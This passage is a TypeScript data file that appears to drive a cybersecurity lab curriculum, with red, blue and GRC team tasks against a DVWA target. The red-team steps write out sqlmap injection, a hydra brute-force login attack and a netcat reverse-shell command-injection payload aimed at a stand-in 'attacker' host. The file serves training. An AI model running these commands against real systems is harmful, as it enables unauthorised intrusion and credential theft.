import { Task, Week, Gate } from './types';

// Week Metadata
export const WEEKS: Record<number, Week> = {
  1: {
    number: 1,
    title: 'Cold Recon',
    theme: 'Build, connect, passive recon, baseline hardening',
    objective: 'Establish baseline, passive reconnaissance, and foundational security controls',
    runs: 'Run 01'
  },
  2: {
    number: 2,
    title: 'Hard Target',
    theme: 'Authorized vulnerability assessment + SOC detection engineering',
    objective: 'Perform vulnerability discovery and detection engineering',
    runs: 'Run 02'
  },
  3: {
    number: 3,
    title: 'The Breach',
    theme: 'Attack, detect, investigate, preserve evidence',
    objective: 'Execute authorized attacks and investigate findings',
    runs: 'Run 03'
  },
  4: {
    number: 4,
    title: 'Payday',
    theme: 'Report and present findings',
    objective: 'Compile and present final findings and recommendations',
    runs: 'Run 04'
  }
};

// Gates
export const GATES: Gate[] = [
  {
    id: 1,
    week: 1,
    title: 'Gate 1',
    description: 'Case + Scope authored',
    requiredArtifactTypes: ['case_overview', 'scope_document'],
    requiredTasks: ['red-w1-osint', 'blue-w1-hardening', 'grc-w1-framework']
  },
  {
    id: 2,
    week: 2,
    title: 'Gate 2',
    description: 'Hardening + Logs in place',
    requiredArtifactTypes: ['hardening_checklist', 'baseline_logs'],
    requiredTasks: ['blue-w2-baseline', 'red-w2-enumeration', 'grc-w2-risk']
  },
  {
    id: 3,
    week: 3,
    title: 'Gate 3',
    description: 'Findings + Evidence complete',
    requiredArtifactTypes: ['pcap', 'findings', 'evidence_log'],
    requiredTasks: ['red-w3-attacks', 'blue-w3-detection', 'grc-w3-custody']
  }
];

// RED (Runners) Tasks
const RED_TASKS: Task[] = [
  {
    id: 'red-w1-osint',
    role: 'red',
    week: 1,
    title: 'OSINT & Passive Recon',
    objective: 'Perform open-source intelligence gathering and passive reconnaissance to build an asset list.',
    frameworks: ['NIST_CSF'],
    deliverables: ['Asset_List.md', 'Recon_Findings.md'],
    steps: [
      {
        id: 'red-w1-s1',
        title: 'Verify Connectivity',
        description: 'Confirm network connectivity and record IP addresses.',
        command: 'ip a && ping -c 1 10.10.10.1',
        commandExplanation: '`ip a` lists every network interface and its assigned address; `ping -c 1` sends a single ICMP echo (the `-c 1` caps it at one packet) to confirm the target answers.',
        commandFlags: [
          { flag: 'ip a', meaning: 'Show all network interfaces and their IP addresses.' },
          { flag: 'ping', meaning: 'Send ICMP echo requests to test reachability.' },
          { flag: '-c 1', meaning: 'Stop after 1 packet instead of pinging forever.' },
          { flag: '10.10.10.1', meaning: 'The host being pinged (the gateway/target).' },
        ],
        expectedOutput: 'eth0 inet 10.10.10.x, ping reply from target',
        outputExplanation: 'Find the `inet` line on `eth0` in the 10.10.10.x range — that is your IP — and a "1 received, 0% packet loss" line proving the target is reachable.',
        whatItMeans: 'Your Kali box has network access to the target; both are on the same subnet.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'red-w1-s2',
        title: 'WHOIS & DNS Enumeration',
        description: 'Query domain registration and DNS records.',
        command: 'whois target.local && dig ANY target.local && nslookup -type=mx target.local',
        commandExplanation: '`whois` pulls registration/ownership records; `dig ANY` asks DNS for every record type at once; `nslookup -type=mx` narrows the query to just mail-exchanger records.',
        commandFlags: [
          { flag: 'whois', meaning: 'Query domain registration / ownership records.' },
          { flag: 'dig ANY', meaning: 'Ask DNS for every record type for the domain.' },
          { flag: 'nslookup -type=mx', meaning: 'Look up only mail-exchanger (mail server) records.' },
        ],
        expectedOutput: 'Domain info, A/MX/NS records',
        outputExplanation: 'The `whois` block shows the registrar and contacts; `dig` lists A (host), NS (name server) and MX (mail) records — the MX names reveal where the target receives email.',
        whatItMeans: 'Reveals registered owner, mail servers, and DNS structure of the target.',
        frameworks: ['NIST_CSF', 'CIS']
      },
      {
        id: 'red-w1-s3',
        title: 'Web Tech Discovery',
        description: 'Identify web technologies, frameworks, and versions.',
        command: 'whatweb http://10.10.10.x',
        commandExplanation: '`whatweb` fingerprints a website by inspecting its headers and page content, identifying the web server, language, and frameworks behind the URL you give it.',
        commandFlags: [
          { flag: 'whatweb', meaning: 'Fingerprint a website’s server, language and frameworks.' },
          { flag: 'http://10.10.10.x', meaning: 'The target URL to fingerprint.' },
        ],
        expectedOutput: 'Apache version, PHP version, technologies used',
        outputExplanation: 'Each `[name version]` tag is a detected technology — note exact version numbers (e.g. Apache 2.4.x, PHP 5.x) because old versions map to known CVEs.',
        whatItMeans: 'Identifies specific software versions which may have known vulnerabilities.',
        frameworks: ['CIS', 'OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w1-s4',
        title: 'Email/Host Discovery',
        description: 'Gather email addresses and host information.',
        command: 'theHarvester -d target.local -b all',
        commandExplanation: '`theHarvester` collects OSINT for a domain; `-d` sets the target domain and `-b all` queries every available source (search engines, certificate logs, etc.).',
        commandFlags: [
          { flag: '-d target.local', meaning: 'The domain to gather intelligence about.' },
          { flag: '-b all', meaning: 'Use every available data source (search engines, certs, etc.).' },
        ],
        expectedOutput: 'Email list, subdomains, hosts',
        outputExplanation: 'Results are grouped into emails, hosts and subdomains — the email addresses become candidate usernames and the subdomains reveal extra attack surface.',
        whatItMeans: 'Identifies potential usernames and infrastructure assets.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'red-w1-s5',
        title: 'Export to Asset List',
        description: 'Compile findings into Asset_List artifact.',
        command: 'cat > Asset_List.md << EOF\n# Discovered Assets\n- IP Range: 10.10.10.0/24\n- Services: SSH, HTTP, DNS\nEOF',
        commandExplanation: 'A here-document (`<< EOF ... EOF`) feeds every line between the markers into `cat`, which writes them to `Asset_List.md` — a quick way to create a multi-line file from the terminal.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
        ],
        expectedOutput: 'Asset_List.md created',
        outputExplanation: 'There is no on-screen output; the shell returns silently on success. Run `cat Asset_List.md` to confirm the file now holds your asset notes.',
        whatItMeans: 'Creates reusable documentation for GRC governance and risk assessment.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'red-w2-enumeration',
    role: 'red',
    week: 2,
    title: 'Vulnerability Discovery',
    objective: 'Perform authorized vulnerability enumeration using network and web scanning.',
    frameworks: ['NIST_CSF', 'CIS', 'OWASP'],
    deliverables: ['Nmap_Scan.txt', 'Nikto_Report.txt', 'Vulnerability_Summary.md'],
    steps: [
      {
        id: 'red-w2-s1',
        title: 'Network Scan - All Ports',
        description: 'Scan all TCP ports with version detection.',
        command: 'nmap -sV -p- 10.10.10.5 > nmap_full.txt',
        commandExplanation: '`nmap` scans for open ports; `-sV` probes each one to detect the service and version; `-p-` scans all 65,535 TCP ports; `> nmap_full.txt` saves the result to a file.',
        commandFlags: [
          { flag: 'nmap', meaning: 'Network port scanner.' },
          { flag: '-sV', meaning: 'Probe open ports to detect service and version.' },
          { flag: '-p-', meaning: 'Scan all 65,535 TCP ports, not just common ones.' },
          { flag: '> nmap_full.txt', meaning: 'Save the output to a file.' },
        ],
        expectedOutput: 'Port list with service versions',
        outputExplanation: 'Each row shows PORT, STATE, SERVICE and VERSION — focus on `open` ports and their version strings, which are your candidate entry points.',
        whatItMeans: 'Discovers all listening network services and their versions.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'red-w2-s2',
        title: 'Web Vulnerability Scan',
        description: 'Run automated web scanner against target.',
        command: 'nikto -h http://10.10.10.5 -o nikto_report.txt',
        commandExplanation: '`nikto` is a web-server scanner; `-h` sets the host URL to test and `-o` writes the findings to a report file.',
        commandFlags: [
          { flag: 'nikto', meaning: 'Automated web-server vulnerability scanner.' },
          { flag: '-h', meaning: 'Target host/URL to scan.' },
          { flag: '-o nikto_report.txt', meaning: 'Write findings to a report file.' },
        ],
        expectedOutput: 'Vulnerabilities: directory indexing, default files, old software',
        outputExplanation: 'Lines beginning with `+` are findings — outdated software, exposed directories, or dangerous default files. Each usually cites an OSVDB/CVE reference to research.',
        whatItMeans: 'Identifies common web misconfigurations and known web vulnerabilities.',
        frameworks: ['OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w2-s3',
        title: 'SSH Auth Methods',
        description: 'Identify authentication methods on SSH.',
        command: 'nmap --script ssh-auth-methods 10.10.10.5',
        commandExplanation: '`nmap --script ssh-auth-methods` runs an NSE script that connects to SSH and asks which authentication methods the server will accept.',
        commandFlags: [
          { flag: '--script ssh-auth-methods', meaning: 'Run the NSE script that lists accepted SSH auth methods.' },
          { flag: '10.10.10.5', meaning: 'The SSH host to query.' },
        ],
        expectedOutput: 'SSH allows password auth',
        outputExplanation: 'The script lists supported methods; seeing `password` means logins can be brute-forced, whereas `publickey` only would be far safer.',
        whatItMeans: 'Password auth enabled = brute force risk; SSH key only would be better.',
        frameworks: ['CIS']
      }
    ]
  },
  {
    id: 'red-w3-attacks',
    role: 'red',
    week: 3,
    title: 'Authorized Attacks & Evidence',
    objective: 'Execute one well-documented exploit chain with complete evidence trail.',
    frameworks: ['OWASP', 'NIST_800_61', 'CVSS'],
    deliverables: ['SQL_Injection_Proof.txt', 'Brute_Force_Proof.txt', 'Reverse_Shell_Proof.txt', 'Evidence_Photos.zip'],
    steps: [
      {
        id: 'red-w3-s1',
        title: 'SQL Injection Attack',
        description: 'Exploit SQL injection vulnerability in DVWA.',
        command: 'sqlmap -u http://10.10.10.5/DVWA/vulnerabilities/sqli/ --auth-creds=admin:password --dbs',
        commandExplanation: '`sqlmap` automates SQL-injection testing; `-u` is the vulnerable URL, `--auth-creds` supplies a login so it can reach the page, and `--dbs` tells it to enumerate database names once injection works.',
        commandFlags: [
          { flag: 'sqlmap', meaning: 'Automated SQL-injection testing tool.' },
          { flag: '-u <url>', meaning: 'The URL to test for SQL injection.' },
          { flag: '--auth-creds=admin:password', meaning: 'Log in first so the vulnerable page is reachable.' },
          { flag: '--dbs', meaning: 'Once injectable, enumerate the database names.' },
        ],
        expectedOutput: 'Database list, users table extracted',
        outputExplanation: 'If injectable, sqlmap prints the DBMS type and an `available databases` list — proof the input is unsanitized and data can be pulled out.',
        whatItMeans: 'Demonstrates data exfiltration risk from SQL injection.',
        frameworks: ['OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s2',
        title: 'Brute Force Attack',
        description: 'Attack login form with hydra.',
        command: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://10.10.10.5/login.php:username=^USER^&password=^PASS^:S=Welcome',
        commandExplanation: '`hydra` brute-forces logins; `-l admin` fixes the username, `-P` points to the rockyou password list, and the `http-post-form` string defines the URL, the field layout (`^USER^`/`^PASS^`), and `S=Welcome` as the success marker.',
        commandFlags: [
          { flag: 'hydra', meaning: 'Parallel login brute-forcer.' },
          { flag: '-l admin', meaning: 'Single username to try (lowercase L).' },
          { flag: '-P rockyou.txt', meaning: 'Password list file to try (uppercase P).' },
          { flag: 'http-post-form', meaning: 'Attack an HTTP POST login form.' },
          { flag: '^USER^ / ^PASS^', meaning: 'Placeholders Hydra fills with each guess.' },
          { flag: 'S=Welcome', meaning: 'Text in the response that marks a successful login.' },
        ],
        expectedOutput: 'Credentials found',
        outputExplanation: 'A green `[80][http-post-form] ... login: admin password: <found>` line means hydra guessed a valid password — evidence of weak credentials and no account lockout.',
        whatItMeans: 'Shows weak password vulnerability and lack of account lockout.',
        frameworks: ['CIS', 'OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s3',
        title: 'Command Injection & Reverse Shell',
        description: 'Inject command and establish reverse shell.',
        command: 'nc -lvnp 4444 & echo "Payload: 127.0.0.1 | nc -c /bin/bash attacker 4444" > /dev/clipboard',
        commandExplanation: '`nc -lvnp 4444` starts a Netcat listener (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port) waiting for the target to connect back; the payload is the injected command that makes the victim run `/bin/bash` piped to your listener.',
        commandFlags: [
          { flag: 'nc', meaning: 'Netcat — raw TCP/UDP connections.' },
          { flag: '-l', meaning: 'Listen mode (wait for a connection).' },
          { flag: '-v', meaning: 'Verbose output.' },
          { flag: '-n', meaning: 'No DNS resolution (use raw IPs).' },
          { flag: '-p 4444', meaning: 'Listen on port 4444.' },
          { flag: '&', meaning: 'Run the listener in the background.' },
        ],
        expectedOutput: 'Reverse shell connection established; id command shows www-data',
        outputExplanation: 'When the victim connects you get a shell prompt; running `id` returns `uid=33(www-data)`, confirming remote code execution as the web-server user.',
        whatItMeans: 'Demonstrates RCE and full system compromise.',
        frameworks: ['OWASP'],
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s4',
        title: 'Screenshot Evidence',
        description: 'Capture proof of successful exploitation.',
        command: 'screenshot named YYYYMMDD_TeamXX_Tool_Action.png',
        commandExplanation: 'This is a naming convention, not a binary: capture the screen and save it as `YYYYMMDD_TeamXX_Tool_Action.png` so every artifact is dated, attributed and self-describing.',
        commandFlags: [
          { flag: 'YYYYMMDD', meaning: 'Date the evidence was captured.' },
          { flag: 'TeamXX', meaning: 'Your team number, for attribution.' },
          { flag: 'Tool', meaning: 'Tool used (e.g. sqlmap, hydra).' },
          { flag: 'Action', meaning: 'What the screenshot proves.' },
        ],
        expectedOutput: 'Evidence file created with naming convention',
        outputExplanation: 'A correctly named PNG (e.g. `20260624_Team01_sqlmap_dbdump.png`) should appear in your evidence folder, ready for the chain-of-custody log.',
        whatItMeans: 'Documented proof required by GRC for compliance and reporting.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'red-w4-briefing',
    role: 'red',
    week: 4,
    title: 'Technical Findings Briefing',
    objective: 'Present technical exploits and findings in plain English to stakeholders.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: ['Technical_Explanation.md', 'Briefing_Slides_Part1.pptx'],
    steps: [
      {
        id: 'red-w4-s1',
        title: 'Review Attack Timeline',
        description: 'Prepare chronological attack narrative.',
        command: 'cat timeline.txt',
        commandExplanation: '`cat` prints the contents of `timeline.txt` to the screen so you can review the attack chronology you recorded.',
        commandFlags: [
          { flag: 'cat', meaning: 'Print a file’s contents to the screen.' },
          { flag: 'timeline.txt', meaning: 'The file holding your recorded attack events.' },
        ],
        expectedOutput: 'Clear sequence of events',
        outputExplanation: 'You should see your timestamped events in order; gaps or out-of-order entries are your cue to tidy the narrative before briefing.',
        whatItMeans: 'Tells the story of how the compromise occurred.',
        frameworks: ['ISO_27001']
      },
      {
        id: 'red-w4-s2',
        title: 'Explain Each Finding',
        description: 'Document what each exploit revealed and its impact.',
        command: 'echo "SQL Injection = Unauthorized data access" >> findings_explained.txt',
        commandExplanation: '`echo` prints text and `>>` appends it to `findings_explained.txt` (append, not overwrite) — building a plain-English glossary one line at a time.',
        commandFlags: [
          { flag: 'echo', meaning: 'Print the given text.' },
          { flag: '>>', meaning: 'Append to the file (keeps existing content).' },
        ],
        expectedOutput: 'Plain language explanations',
        outputExplanation: 'Nothing prints to screen; `cat findings_explained.txt` should show your growing list of finding-to-impact translations.',
        whatItMeans: 'Non-technical stakeholders understand the risk.',
        frameworks: ['ISO_27001']
      }
    ]
  }
];

// BLUE (Wardens) Tasks
const BLUE_TASKS: Task[] = [
  {
    id: 'blue-w1-hardening',
    role: 'blue',
    week: 1,
    title: 'Baseline Hardening',
    objective: 'Harden the DVWA server with essential security controls.',
    frameworks: ['NIST_CSF', 'CIS'],
    deliverables: ['Hardening_Checklist.txt', 'UFW_Status.txt', 'Lynis_Report.html'],
    steps: [
      {
        id: 'blue-w1-s1',
        title: 'SSH Into Target',
        description: 'Establish secure connection to target server.',
        command: 'ssh user@10.10.10.5',
        commandExplanation: '`ssh user@host` opens an encrypted remote shell to the server as the named user, prompting for that account password.',
        commandFlags: [
          { flag: 'ssh', meaning: 'Open an encrypted remote shell.' },
          { flag: 'user@10.10.10.5', meaning: 'Log in as “user” on the target host.' },
        ],
        expectedOutput: 'Shell prompt; whoami shows non-root user',
        outputExplanation: 'A changed prompt (e.g. `user@target:~$`) means you are in; `whoami` returning a non-root name confirms least-privilege access.',
        whatItMeans: 'You are connected as non-root (good security), can now apply hardening.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'blue-w1-s2',
        title: 'Update System',
        description: 'Apply latest security patches.',
        command: 'sudo apt update && sudo apt upgrade -y',
        commandExplanation: '`apt update` refreshes the package index; `apt upgrade -y` then installs all available updates with `-y` auto-confirming the prompts. `sudo` runs both as root.',
        commandFlags: [
          { flag: 'sudo', meaning: 'Run as root (required to change the system).' },
          { flag: 'apt update', meaning: 'Refresh the list of available packages.' },
          { flag: 'apt upgrade', meaning: 'Install the available updates.' },
          { flag: '-y', meaning: 'Auto-answer “yes” to prompts.' },
        ],
        expectedOutput: 'Packages updated',
        outputExplanation: 'Watch the summary line — "X upgraded, Y newly installed" — and make sure it finishes without errors, meaning known-vulnerable packages are now patched.',
        whatItMeans: 'Patches known vulnerabilities in OS and applications.',
        frameworks: ['CIS']
      },
      {
        id: 'blue-w1-s3',
        title: 'Configure Firewall',
        description: 'Enable UFW and allow only SSH and HTTP.',
        command: 'sudo ufw default deny incoming && sudo ufw allow 22 && sudo ufw allow 80 && sudo ufw enable',
        commandExplanation: 'Builds a default-deny firewall: `default deny incoming` blocks all inbound traffic, `allow 22`/`allow 80` open SSH and HTTP, and `enable` activates the ruleset.',
        commandFlags: [
          { flag: 'default deny incoming', meaning: 'Block all inbound traffic by default.' },
          { flag: 'allow 22', meaning: 'Permit SSH.' },
          { flag: 'allow 80', meaning: 'Permit HTTP.' },
          { flag: 'enable', meaning: 'Turn the firewall on.' },
        ],
        expectedOutput: 'UFW enabled, status shows SSH and HTTP allowed',
        outputExplanation: '`Firewall is active and enabled on system startup` confirms it is on; `ufw status` should then list only 22 and 80 as ALLOW.',
        whatItMeans: 'Restricts inbound traffic to only necessary services.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w1-s4',
        title: 'Install Fail2Ban',
        description: 'Protect against brute force attacks.',
        command: 'sudo apt install fail2ban && sudo systemctl enable fail2ban',
        commandExplanation: '`apt install fail2ban` installs the intrusion-prevention tool; `systemctl enable` sets it to start automatically at every boot.',
        commandFlags: [
          { flag: 'apt install fail2ban', meaning: 'Install the brute-force protection tool.' },
          { flag: 'systemctl enable fail2ban', meaning: 'Start it automatically on every boot.' },
        ],
        expectedOutput: 'Fail2Ban running and enabled',
        outputExplanation: '`Created symlink ... fail2ban.service` confirms it is enabled; `systemctl status fail2ban` should read `active (running)`.',
        whatItMeans: 'Automatically blocks repeated failed login attempts.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w1-s5',
        title: 'System Audit with Lynis',
        description: 'Run comprehensive security audit.',
        command: 'sudo lynis audit system > lynis_report.txt',
        commandExplanation: '`lynis audit system` runs a comprehensive local security audit across files, services and config; `> lynis_report.txt` captures the full output for review.',
        commandFlags: [
          { flag: 'lynis audit system', meaning: 'Run a full local security audit.' },
          { flag: '> lynis_report.txt', meaning: 'Save the audit output to a file.' },
        ],
        expectedOutput: 'Hardening index score, warnings list',
        outputExplanation: 'The end shows a `Hardening index` (0–100) plus `Warnings` and `Suggestions` — the index tracks your progress and the warnings are your to-do list.',
        whatItMeans: 'Identifies remaining security gaps and compliance issues.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'blue-w2-baseline',
    role: 'blue',
    week: 2,
    title: 'Baseline Capture & Detection Engineering',
    objective: 'Capture normal traffic and design detection rules for attacks.',
    frameworks: ['NIST_CSF', 'NIST_800_115'],
    deliverables: ['Baseline_Traffic.pcap', 'Attack_Traffic.pcap', 'Wireshark_Filters.txt', 'Detection_Rules.txt'],
    steps: [
      {
        id: 'blue-w2-s1',
        title: 'Capture Normal Traffic',
        description: 'Record baseline traffic while accessing application normally.',
        command: 'sudo tcpdump -i eth0 -w baseline.pcap',
        commandExplanation: '`tcpdump` captures network packets; `-i eth0` selects the interface to sniff and `-w baseline.pcap` writes raw packets to a file (instead of printing them) for later analysis.',
        commandFlags: [
          { flag: 'tcpdump', meaning: 'Capture network packets.' },
          { flag: '-i eth0', meaning: 'Capture on the eth0 interface.' },
          { flag: '-w baseline.pcap', meaning: 'Write raw packets to a file for later analysis.' },
        ],
        expectedOutput: 'PCAP file with normal HTTP requests',
        outputExplanation: 'It prints `listening on eth0...` and a rising packet count; stop with Ctrl-C — the resulting `baseline.pcap` holds your normal-traffic sample.',
        whatItMeans: 'Establishes pattern of legitimate traffic for comparison.',
        frameworks: ['NIST_800_115'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w2-s2',
        title: 'Analyze Baseline in Wireshark',
        description: 'Study normal traffic patterns and timing.',
        command: 'wireshark baseline.pcap & # Filter: http.request',
        commandExplanation: 'Opens the capture in the Wireshark GUI (the `&` frees your terminal); typing `http.request` in the display-filter bar shows only outbound HTTP requests.',
        commandFlags: [
          { flag: 'wireshark baseline.pcap', meaning: 'Open the capture in the GUI analyzer.' },
          { flag: '&', meaning: 'Run it in the background so the terminal is free.' },
          { flag: 'http.request', meaning: 'Display filter: show only HTTP requests.' },
        ],
        expectedOutput: 'Sequential requests, normal request rate, complete handshakes',
        outputExplanation: 'You should see steady, evenly-spaced requests and complete TCP handshakes (SYN, SYN-ACK, ACK) — this is what "normal" looks like for later comparison.',
        whatItMeans: 'Understand what normal looks like to detect anomalies.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'blue-w2-s3',
        title: 'Create Detection Filters',
        description: 'Write Wireshark filters for common attack patterns.',
        command: 'echo "Filter 1: tcp.flags.syn==1 && tcp.flags.ack==0 (SYN scan)" > detection_filters.txt',
        commandExplanation: '`echo ... > detection_filters.txt` saves a Wireshark display filter to a file; `tcp.flags.syn==1 && tcp.flags.ack==0` matches lone SYN packets — the signature of a port scan.',
        commandFlags: [
          { flag: 'tcp.flags.syn==1', meaning: 'Match packets with the SYN flag set.' },
          { flag: 'tcp.flags.ack==0', meaning: '…and the ACK flag clear — a lone SYN means a scan.' },
          { flag: '> detection_filters.txt', meaning: 'Save the filter to a file.' },
        ],
        expectedOutput: 'List of Wireshark filters',
        outputExplanation: 'No screen output; `cat detection_filters.txt` confirms the filter is saved, ready to paste into Wireshark during an attack.',
        whatItMeans: 'Filters enable rapid identification of suspicious activity.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'blue-w3-detection',
    role: 'blue',
    week: 3,
    title: 'Live Detection & Response',
    objective: 'Detect attacks as they happen and respond with containment.',
    frameworks: ['NIST_CSF', 'NIST_800_61'],
    deliverables: ['Attack_Pcap.pcap', 'Attack_Logs.txt', 'Incident_Response.txt', 'Containment_Actions.txt'],
    steps: [
      {
        id: 'blue-w3-s1',
        title: 'Start Live Packet Capture',
        description: 'Begin recording before Red starts attacks.',
        command: 'sudo tcpdump -i eth0 -w attack_capture.pcap',
        commandExplanation: 'Same packet capture as the baseline, started *before* the Red team attacks so every malicious packet is recorded to `attack_capture.pcap`.',
        commandFlags: [
          { flag: 'tcpdump', meaning: 'Capture network packets.' },
          { flag: '-i eth0', meaning: 'Capture on the eth0 interface.' },
          { flag: '-w attack_capture.pcap', meaning: 'Write packets to the attack-capture file.' },
        ],
        expectedOutput: 'Capture running, file growing',
        outputExplanation: '`listening on eth0` plus a climbing packet count means it is recording; verify the `.pcap` file size grows as traffic arrives.',
        whatItMeans: 'Forensic evidence collection; chain of custody begins.',
        frameworks: ['NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s2',
        title: 'Monitor Logs in Real Time',
        description: 'Watch system and web server logs.',
        command: 'tail -f /var/log/apache2/access.log',
        commandExplanation: '`tail -f` prints the end of the Apache access log and then *follows* it, streaming each new request live as it is written.',
        commandFlags: [
          { flag: 'tail', meaning: 'Show the end of a file.' },
          { flag: '-f', meaning: 'Follow — stream new lines as they are written.' },
          { flag: '/var/log/apache2/access.log', meaning: 'The Apache request log to watch.' },
        ],
        expectedOutput: 'HTTP requests, errors, failed auth attempts',
        outputExplanation: 'Each line is one HTTP request (IP, time, method, URL, status). A burst of requests or repeated 401/404s flags attacker activity in real time.',
        whatItMeans: 'Real-time visibility into attacker activity.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s3',
        title: 'Detect SQL Injection Pattern',
        description: 'Identify SQL injection attempt in logs.',
        command: 'grep -i "union\\|select" /var/log/apache2/access.log',
        commandExplanation: '`grep -i` searches the log case-insensitively; the pattern `union\\|select` matches either SQL keyword, surfacing requests that look like SQL injection.',
        commandFlags: [
          { flag: 'grep', meaning: 'Search text for a pattern.' },
          { flag: '-i', meaning: 'Case-insensitive match.' },
          { flag: 'union\\|select', meaning: 'Match either SQL keyword (\\| means OR).' },
        ],
        expectedOutput: 'SQL keywords in request URLs',
        outputExplanation: 'Any matching line contains `UNION`/`SELECT` inside a URL — legitimate users never send SQL, so these confirm an injection attempt and give you the attacker IP.',
        whatItMeans: 'Confirms SQL injection attack attempt.',
        frameworks: ['OWASP', 'NIST_800_61'],
        isEvidenceStep: true
      },
      {
        id: 'blue-w3-s4',
        title: 'Block Attacker IP',
        description: 'Use firewall to deny further traffic from attacker.',
        command: 'sudo ufw deny from 10.10.10.x',
        commandExplanation: '`ufw deny from <ip>` inserts a firewall rule that drops all traffic from the attacker address — an immediate containment action.',
        commandFlags: [
          { flag: 'ufw deny from', meaning: 'Add a rule that drops all traffic from an address.' },
          { flag: '10.10.10.x', meaning: 'The attacker IP to block.' },
        ],
        expectedOutput: 'UFW rule added',
        outputExplanation: '`Rule added` confirms it; `ufw status` now lists a DENY entry for that IP and the attacker requests stop appearing in the logs.',
        whatItMeans: 'Containment action stops ongoing attacks.',
        frameworks: ['NIST_800_61']
      }
    ]
  },
  {
    id: 'blue-w4-response',
    role: 'blue',
    week: 4,
    title: 'Incident Response Findings',
    objective: 'Present detection engineering and response actions.',
    frameworks: ['NIST_800_61', 'NIST_CSF'],
    deliverables: ['Detection_Summary.md', 'Response_Timeline.md', 'Briefing_Slides_Part2.pptx'],
    steps: [
      {
        id: 'blue-w4-s1',
        title: 'Compile Detection Evidence',
        description: 'Document what was detected and when.',
        command: 'cat > detection_summary.md << EOF\n# Detection Timeline\n- 14:23:45: SYN scan detected\n- 14:25:12: SQL injection attempt\nEOF',
        commandExplanation: 'A here-doc writes the multi-line detection timeline straight into `detection_summary.md` from the terminal.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
        ],
        expectedOutput: 'Timeline created',
        outputExplanation: 'The shell returns silently; `cat detection_summary.md` shows your timestamped detections, demonstrating how fast each attack was caught.',
        whatItMeans: 'Shows detection capability and speed of response.',
        frameworks: ['NIST_800_61']
      }
    ]
  }
];

// GRC (Fixers) Tasks
const GRC_TASKS: Task[] = [
  {
    id: 'grc-w1-framework',
    role: 'grc',
    week: 1,
    title: 'Framework Mapping & Policy',
    objective: 'Map baseline findings to security frameworks and draft policy.',
    frameworks: ['NIST_CSF', 'CIS', 'STRIDE'],
    deliverables: ['Framework_Mapping.md', 'Lab_Security_Policy_v1.0.md'],
    steps: [
      {
        id: 'grc-w1-s1',
        title: 'Review Red & Blue Findings',
        description: 'Gather all Week 1 artifacts from teammates.',
        command: 'ls /shared/team-artifacts/week-1/',
        commandExplanation: '`ls` lists the files in the shared Week 1 folder so you can confirm Red and Blue have delivered their artifacts.',
        commandFlags: [
          { flag: 'ls', meaning: 'List the files in a directory.' },
          { flag: '/shared/team-artifacts/week-1/', meaning: 'The shared folder to inspect.' },
        ],
        expectedOutput: 'Asset_List.md, Hardening_Checklist.txt',
        outputExplanation: 'You should see the expected filenames; anything missing is a teammate you need to chase before you can map their work.',
        whatItMeans: 'Inventory of discoveries and controls implemented.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'grc-w1-s2',
        title: 'Map to NIST CSF ID.AM',
        description: 'Link findings to NIST CSF Asset Management controls.',
        command: 'cat > framework_mapping.txt << EOF\nID.AM-1: Asset inventory = Asset_List.md\nEOF',
        commandExplanation: 'A here-doc records a mapping line into `framework_mapping.txt`, linking a specific NIST CSF control (`ID.AM-1`, asset inventory) to the artifact that satisfies it.',
        commandFlags: [
          { flag: 'cat >', meaning: 'Write the following input to a file (overwrites it).' },
          { flag: '<< EOF … EOF', meaning: 'Here-document: send every line until EOF as input.' },
          { flag: 'ID.AM-1', meaning: 'The NIST CSF control id being satisfied (asset inventory).' },
        ],
        expectedOutput: 'Mapping document',
        outputExplanation: 'No output on screen; `cat framework_mapping.txt` confirms the control-to-evidence link is recorded for the audit trail.',
        whatItMeans: 'Demonstrates compliance with security framework.',
        frameworks: ['NIST_CSF'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w1-s3',
        title: 'Map to CIS Controls',
        description: 'Link to CIS Critical Security Controls.',
        command: 'echo "CIS-1: Firewall configured = UFW" >> cis_mapping.txt',
        commandExplanation: '`echo ... >> cis_mapping.txt` appends one mapping line tying a CIS Control (CIS-1, inventory and secure config) to the implemented UFW firewall.',
        commandFlags: [
          { flag: 'echo', meaning: 'Print the given text.' },
          { flag: '>> cis_mapping.txt', meaning: 'Append the line to the file (keeps existing content).' },
        ],
        expectedOutput: 'CIS mapping created',
        outputExplanation: 'Silent on screen; `cat cis_mapping.txt` shows the accumulating CIS-control-to-evidence list.',
        whatItMeans: 'Aligns with industry best practices.',
        frameworks: ['CIS'],
        isEvidenceStep: true
      },
      {
        id: 'grc-w1-s4',
        title: 'Draft Security Policy v1.0',
        description: 'Create baseline policy document.',
